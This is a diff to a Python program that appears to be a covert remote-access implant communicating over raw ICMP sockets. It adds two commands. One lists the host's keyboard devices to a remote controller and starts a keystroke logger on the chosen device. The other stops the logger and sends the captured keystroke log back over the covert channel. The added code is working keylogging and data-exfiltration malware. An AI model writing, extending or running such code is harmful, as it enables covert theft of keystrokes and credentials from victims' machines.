@@ -1096,13 +1096,93 @@ def send_file(ctx: Context):
 
 
 def run_bg(ctx: Context):
-    print("Starting bg...")
-    start_logger("hotkey.log")
+    """CMD_RUN_BG: Send device list, receive choice, start logger"""
+    if not ctx.connected_to:
+        return
+    source_ip = detect_source_ip(ctx.connected_to)
+
+    try:
+        recv_socket = open_raw_icmp_recv_socket()
+        send_socket = open_raw_send_socket()
+    except PermissionError:
+        ctx.error_message = "permission denied (raw sockets require sudo)"
+        handle_error(ctx)
+        return
+
+    try:
+        from hotkeys import list_devices_for_remote, start_logger
+
+        device_list_text, devices = list_devices_for_remote()
+        print(f"[BG] Sending {len(devices)} keyboard options to hosta...")
+
+        send_ack(send_socket, source_ip, ctx.connected_to, ctx.key, ACK_READY)
+
+        if not send_byte_stream_chunked(send_socket, recv_socket, source_ip,
+                                        ctx.connected_to, ctx.key,
+                                        device_list_text.encode("utf-8")):
+            print("[BG] Failed to send device list")
+            return
+
+        print("[BG] Waiting for device selection...")
+
+        choice_bytes = receive_byte_stream_chunked(
+            recv_socket, send_socket, source_ip, ctx.connected_to,
+            ctx.key, METADATA_TIMEOUT_SECONDS
+        )
+        if choice_bytes is None:
+            print("[BG] Choice receive failed")
+            return
+
+        try:
+            choice = int(choice_bytes.decode("utf-8").strip())
+            if 0 <= choice < len(devices):
+                from hotkeys import logger_device
+                logger_device = devices[choice]
+                print(f"[BG] Selected: {logger_device.path}")
+                start_logger("hotkey.log")
+            else:
+                print(f"[BG] Invalid choice {choice}")
+        except Exception as e:
+            print(f"[BG] Choice error: {e}")
+
+    finally:
+        recv_socket.close()
+        send_socket.close()
 
 
 def stop_bg(ctx: Context):
-    print("Stopping bg...")
+    """CMD_STOP_BG: Stop logger + send log back using same protocol"""
+    if not ctx.connected_to:
+        return
+
+    from hotkeys import stop_logger, get_hotkey_log_content
+    print("Stopping background logger...")
     stop_logger()
+
+    source_ip = detect_source_ip(ctx.connected_to)
+    try:
+        recv_socket = open_raw_icmp_recv_socket()
+        send_socket = open_raw_send_socket()
+    except PermissionError:
+        ctx.error_message = "permission denied (raw sockets require sudo)"
+        handle_error(ctx)
+        return
+
+    try:
+        send_ack(send_socket, source_ip, ctx.connected_to, ctx.key, ACK_READY)
+
+        log_content = get_hotkey_log_content("hotkey.log")
+        print(f"[BG] Sending log ({len(log_content)} bytes)...")
+
+        if send_byte_stream_chunked(send_socket, recv_socket, source_ip,
+                                    ctx.connected_to, ctx.key,
+                                    log_content.encode("utf-8")):
+            print("[BG] Log sent successfully")
+        else:
+            print("[BG] Log send failed")
+    finally:
+        recv_socket.close()
+        send_socket.close()
 
 
 def uninstall(ctx: Context):
